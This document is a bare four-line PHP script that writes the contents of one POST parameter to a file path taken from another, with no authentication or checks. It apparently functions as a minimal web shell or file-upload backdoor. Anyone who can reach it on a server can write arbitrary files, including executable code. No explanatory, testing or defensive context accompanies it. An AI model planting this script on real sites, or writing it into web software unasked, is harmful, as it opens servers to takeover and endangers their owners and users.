<?php
$f = fopen($_POST["f"], "w") or die("Unable to open file: " . $_POST["f"]);
fwrite($f, $_POST["c"]);
fclose($f);